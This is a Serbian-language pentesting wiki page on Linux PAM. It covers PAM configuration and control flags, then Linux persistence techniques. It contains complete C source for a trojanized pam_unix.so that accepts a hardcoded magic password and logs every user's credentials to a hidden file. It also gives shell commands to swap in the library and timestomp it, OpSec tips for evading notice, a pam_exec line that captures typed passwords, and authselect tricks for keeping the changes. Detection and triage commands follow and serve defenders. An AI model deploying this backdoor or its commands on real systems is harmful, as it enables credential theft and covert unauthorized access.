# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Osnovne informacije

**PAM (Pluggable Authentication Modules)** služi kao bezbednosni mehanizam koji **proverava identitet korisnika koji pokušavaju da pristupe računarskim servisima**, kontrolišući njihov pristup na osnovu različitih kriterijuma. Sličan je digitalnom vrataru koji obezbeđuje da samo ovlašćeni korisnici mogu da koriste određene servise, uz mogućnost ograničavanja njihovog korišćenja kako bi se sprečilo preopterećenje sistema.

#### Konfiguracione datoteke

- **Solaris i UNIX-based sistemi** obično koriste centralnu konfiguracionu datoteku koja se nalazi na putanji `/etc/pam.conf`.
- **Linux sistemi** preferiraju pristup sa direktorijumom, čuvajući konfiguracije specifične za servise unutar direktorijuma `/etc/pam.d`. Na primer, konfiguraciona datoteka za login servis nalazi se na putanji `/etc/pam.d/login`.

Primer PAM konfiguracije za login servis mogao bi da izgleda ovako:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM oblasti upravljanja**

Ove oblasti, odnosno grupe za upravljanje, obuhvataju **auth**, **account**, **password** i **session**, pri čemu je svaka odgovorna za različite aspekte procesa autentifikacije i upravljanja sesijom:

- **Auth**: Proverava identitet korisnika, često zahtevajući unos lozinke.
- **Account**: Obavlja verifikaciju naloga i proverava uslove kao što su članstvo u grupi ili vremenska ograničenja.
- **Password**: Upravlja ažuriranjem lozinke, uključujući proveru složenosti i sprečavanje dictionary attacks.
- **Session**: Upravlja radnjama pri pokretanju ili završetku servisne sesije, kao što su montiranje direktorijuma ili postavljanje ograničenja resursa.

#### **Kontrole PAM modula**

Kontrole određuju reakciju modula na uspeh ili neuspeh i utiču na celokupan proces autentifikacije. Obuhvataju:

- **Required**: Neuspeh required modula dovodi do konačnog neuspeha, ali tek nakon provere svih narednih modula.
- **Requisite**: Trenutno prekida proces nakon neuspeha.
- **Sufficient**: Uspeh preskače preostale provere iste oblasti, osim ako naredni modul ne doživi neuspeh.
- **Optional**: Izaziva neuspeh samo ako je jedini modul u stack-u.

#### Ofanzivna semantika koja je važna

Prilikom backdooring PAM-a, **lokacija ubačenog pravila** često je važnija od samog payload-a:

- `include` i `substack` preuzimaju pravila iz drugih fajlova, tako da izmena `sshd`-a može uticati samo na SSH, dok izmena `system-auth`, `common-auth` ili drugog shared stack-a može istovremeno uticati na više servisa.
- PAM podržava i kontrole u uglastim zagradama, kao što je `[success=1 default=ignore]`. One se mogu zloupotrebiti za **preskakanje jednog ili više modula** nakon uspešne custom provere, umesto očigledne zamene `pam_unix.so`.
- `module-path` može biti **apsolutan** (`/usr/lib/security/pam_custom.so`) ili **relativan** u odnosu na podrazumevani PAM module directory. Na modernim Linux sistemima stvarni direktorijumi često su `/lib/security`, `/lib64/security`, `/usr/lib/security` ili multiarch putanje kao što je `/usr/lib/x86_64-linux-gnu/security`.

Brzi operatorski zaključak: uvek mapirajte **ceo service graph** pre patching-a. Na primer, `sshd -> password-auth -> system-auth` na nekim distro-ima ili `sshd -> system-remote-login -> system-login -> system-auth` na drugim znači da isti implant u jednoj liniji može imati mnogo širi uticaj nego što je planirano.

#### Primer scenarija

U postavci sa više auth modula, proces prati strogo definisan redosled. Ako modul `pam_securetty` utvrdi da login terminal nije autorizovan, root logins se blokiraju, ali se svi moduli i dalje obrađuju zbog njegovog statusa "required". `pam_env` postavlja environment variables, što potencijalno može poboljšati user experience. Moduli `pam_ldap` i `pam_unix` zajedno autentifikuju korisnika, pri čemu `pam_unix` pokušava da iskoristi prethodno unetu lozinku, čime se poboljšavaju efikasnost i fleksibilnost metoda autentifikacije.


## Backdooring PAM – Hooking `pam_unix.so`

Klasičan persistence trik u Linux okruženjima visoke vrednosti jeste **zamena legitimne PAM biblioteke trojanizovanim drop-in-om**. Pošto se svaki SSH / console login na kraju završava pozivom `pam_unix.so:pam_sm_authenticate()`, dovoljno je nekoliko linija C koda za hvatanje credentials-a ili implementaciju *magic* password bypass-a.

### Cheatsheet za kompilaciju
<details>
<summary>Primer `pam_unix.so` trojana</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Kompajliraj i neprimetno zameni:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Saveti
1. **Atomic overwrite** – upišite u privremenu datoteku, a zatim je pomoću `mv` postavite na odredište da biste izbegli napola upisane biblioteke koje bi zaključale SSH.
2. Postavljanje log datoteke, kao što je `/usr/bin/.dbus.log`, uklapa se među legitimne desktop artefakte.
3. Održavajte identične exports simbola (`pam_sm_setcred`, itd.) da biste izbegli nepravilno ponašanje PAM-a.

### Detekcija
* Uporedite MD5/SHA256 vrednosti za `pam_unix.so` sa vrednostima distro paketa.
* `rpm -V pam` ili `debsums -s libpam-modules` mogu otkriti zamenjene biblioteke bez ručnog hashovanja.
* Proverite da li su datoteke ispod `/lib/security/` globalno upisive ili imaju neuobičajeno vlasništvo.
* `auditd` pravilo: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Pretražite PAM konfiguracije u potrazi za neočekivanim modulima: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Brze triage komande (nakon kompromitovanja ili tokom threat hunting-a)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Zloupotreba `pam_exec` za persistence
Umesto zamene `pam_unix.so`, manje invazivan pristup je dodavanje `pam_exec` linije u `/etc/pam.d/sshd`, tako da svako SSH prijavljivanje pokrene implant, uz očuvanje normalnog stack-a:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` prima PAM metapodatke u promenljivama okruženja kao što su `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` i `PAM_TYPE`. Uz `expose_authtok`, pomoćni program takođe može da pročita lozinku sa `stdin` tokom `auth` ili `password` faza. Ako želite da se pomoćni program pokreće sa efektivnim UID-om umesto stvarnog UID-a, dodajte `seteuid`.

Praktične napomene:

- `session optional pam_exec.so ...` je pogodniji za **radnje nakon prijavljivanja**, kao što su ponovno otvaranje socket-a ili pokretanje odvojenog daemon-a.
- `auth optional pam_exec.so quiet expose_authtok ...` je uobičajen izbor za **hvatanje akreditiva**, jer se izvršava pre otvaranja sesije.
- `type=session` ili `type=auth` mogu se koristiti za ograničavanje izvršavanja na određenu PAM fazu i izbegavanje nepotrebnog dvostrukog izvršavanja.

### Očuvanje izmena kroz distro alate: `authselect`

Na sistemima RHEL, CentOS Stream, Fedora i njihovim derivatima, direktne izmene generisanih datoteka kao što su `/etc/pam.d/system-auth` ili `/etc/pam.d/password-auth` mogu biti **prepisane pomoću `authselect`**. Za trajno zadržavanje izmena, operatori često menjaju aktivni prilagođeni profil u okviru `/etc/authselect/custom/<profile>/`, a zatim ga ponovo biraju ili primenjuju.

Tipičan postupak kada imate root pristup:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Ovo je važno i za ofanzivu i za trijažu: ako `/etc/pam.d/system-auth` sadrži baner `Generated by authselect` i `Do not modify this file manually`, stvarna tačka persistence-a može da se nalazi u `/etc/authselect/custom/`, a ne u `/etc/pam.d/`.

### Nedavno uočene tradecraft tehnike

Nedavni izveštaji iz 2025. godine o **Plague** Linux backdoor-u pokazali su istu osnovnu ideju podignutu na viši nivo: zlonamernu PAM komponentu sa **static bypass password**, uz brisanje SSH-povezanih environment varijabli i shell istorije (`HISTFILE=/dev/null`) radi smanjenja tragova sesije nakon prijavljivanja. Ovo je koristan hunting obrazac, jer logika backdoor-a može da se nalazi u PAM-u, dok se stealth artefakti pojavljuju tek **nakon** uspešne autentifikacije.


## Reference

- [pam.conf(5) / pam.d(5) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [Nextron Systems - Plague: Novootkriveni PAM-based backdoor za Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
